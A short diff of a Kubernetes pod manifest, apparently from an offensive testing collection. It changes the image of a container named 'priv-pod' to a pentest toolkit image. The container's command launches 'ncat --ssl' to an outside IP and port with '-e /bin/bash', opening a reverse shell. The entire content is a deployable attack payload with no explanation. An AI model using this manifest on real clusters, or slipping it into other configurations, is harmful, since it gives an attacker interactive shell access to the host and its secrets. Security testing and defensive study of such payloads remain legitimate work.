@@ -37,6 +37,6 @@ metadata:
 spec:
   containers:
   - name: priv-pod
-    image: raesene/ncat
+    image: r0binak/mtkpi:v1.5
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "ncat --ssl 172.29.4.138 2283 -e /bin/bash;" ]
